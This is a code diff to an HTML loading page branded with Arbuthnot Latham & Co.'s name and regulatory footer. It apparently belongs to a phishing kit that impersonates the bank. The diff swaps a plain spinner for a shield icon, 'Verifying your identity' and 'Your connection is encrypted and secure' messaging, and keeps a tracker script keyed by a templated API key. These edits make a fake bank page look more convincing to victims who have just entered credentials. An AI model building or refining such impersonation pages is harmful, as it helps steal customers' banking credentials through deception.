@@ -7,7 +7,7 @@
     <link rel="icon" type="image/x-icon" href="assets/favicon37E5.ico">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Crimson+Text:wght@400;600&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Crimson+Text:wght@400;600&family=Open+Sans:wght@300;400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="loading.css">
 
 <script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
@@ -21,13 +21,38 @@
 
     <main class="main-content">
         <div class="loading-container">
-            <div class="loading-box">
-                <div class="spinner-container">
-                    <div class="spinner"></div>
+            <div class="loading-card">
+
+                <!-- Shield / Security icon -->
+                <div class="security-icon-wrap">
+                    <svg class="shield-svg" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M32 4L8 14v18c0 13.25 10.4 25.64 24 28 13.6-2.36 24-14.75 24-28V14L32 4z" fill="#1e3d5c" opacity="0.08"/>
+                        <path d="M32 8L10 17v15c0 11.8 9.3 22.8 22 25 12.7-2.2 22-13.2 22-25V17L32 8z" stroke="#1e3d5c" stroke-width="2" fill="none"/>
+                        <polyline points="22,32 29,39 42,26" stroke="#1e3d5c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
                 </div>
-                
-                <h1>Please Wait</h1>
-                <p class="loading-text">We are verifying your information...</p>
+
+                <h1>Verifying your identity</h1>
+                <p class="loading-subtitle">Please wait while we securely authenticate your credentials</p>
+
+                <!-- Animated progress bar -->
+                <div class="progress-track">
+                    <div class="progress-bar"></div>
+                </div>
+
+                <!-- Animated dots -->
+                <div class="dots-row" aria-label="Loading">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+
+                <p class="loading-note">
+                    <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M8 1l1.5 4.5H14l-3.75 2.75L11.75 13 8 10.25 4.25 13l1.5-4.75L2 5.5h4.5L8 1z" stroke="#8a9ab0" stroke-width="1.2" stroke-linejoin="round"/>
+                    </svg>
+                    Your connection is encrypted and secure
+                </p>
             </div>
         </div>
     </main>
@@ -73,13 +98,13 @@
                     <img src="assets/footerblacjicon.svg" alt="FSCS Protected" class="fscs-icon">
                 </div>
                 <div class="fscs-text">
-                    Arbuthnot Latham & Co., Limited is covered by the Financial Services Compensation Scheme (FSCS)
+                    Arbuthnot Latham &amp; Co., Limited is covered by the Financial Services Compensation Scheme (FSCS)
                 </div>
             </div>
         </div>
         
         <div class="footer-legal">
-            Registered in England and Wales No. 819519. Arbuthnot Latham & Co., Limited is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. Arbuthnot Latham & Co., Limited is on the Financial Services Register under Firm Reference Number 143336.
+            Registered in England and Wales No. 819519. Arbuthnot Latham &amp; Co., Limited is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. Arbuthnot Latham &amp; Co., Limited is on the Financial Services Register under Firm Reference Number 143336.
         </div>
     </footer>
 </body>
